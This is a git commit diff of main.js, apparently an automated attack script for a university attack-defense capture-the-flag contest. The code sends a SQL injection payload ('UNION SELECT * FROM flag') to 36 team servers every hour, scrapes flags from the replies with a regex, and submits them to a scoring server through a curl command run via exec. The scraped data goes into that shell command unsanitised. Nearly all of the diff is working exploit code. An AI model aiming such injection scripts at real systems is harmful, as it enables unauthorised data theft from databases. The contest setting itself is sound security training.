90682d1fa6fa1f070668f72410a4d305efb780d1
Ting-Yen Lai <banacorn@gmail.com>
2015-06-23 19:16:21 +0800

    update

--- main.js
+++ main.js
@@ -3,23 +3,24 @@ var colors = require('colors');
 var exec = require('child_process').exec;
 var schedule = require('node-schedule');
 
-var inject = function (team) {
+// assembles injection code
+var genInjectionCode = function (team) {
     return "http://10.8." + team.toString() + ".100:7788/menu.php/db/name/1'+UNION+SELECT+*+FROM+flag+UNION+SELECT+*+FROM+pm_list+WHERE+id='2";
 }
 
+// submit flag
 var submit = function (flag) {
     var command = "curl –L http://people.cs.nctu.edu.tw/~hwcheng/NSFinal/flag.php?ID=13&flag=" + flag.toString();
     child = exec(command);
 }
 
+// regex for flag scrawling
 var regex = /\>(\d) (\w*)\<\/div\>/;
 
 var attack = function (team) {
-    console.log('ATTACKING: '.green + inject(team));
-    var req = http.request(inject(team), function (res) {
-        // console.log('STATUS: '.green + res.statusCode);
-        //console.log('HEADERS: '.green + JSON.stringify(res.headers));
-        //res.setEncoding('utf8');
+    // console.log('ATTACKING: '.green + genInjectionCode(team));
+    var req = http.request(genInjectionCode(team), function (res) {
+        res.setEncoding('utf8');
         res.on('data', function (chunk) {
             match = chunk.toString().match(regex);
             if (match) {
@@ -30,19 +31,16 @@ var attack = function (team) {
         });
 
     });
-
     req.on('error', function(e) {
-      console.log('problem with request: ' + e.message);
+      console.log('ERROR: '.red + e.message);
     });
     req.end();
 }
 
-
-
 var rule = new schedule.RecurrenceRule();
 rule.minute = 0;
 var j = schedule.scheduleJob(rule, function(){
-    console.log('START ATTACKING'.red);
+    console.log('====== START ATTACKING ====='.red);
     for (i = 0; i < 36; i++)
         attack(i);
 });
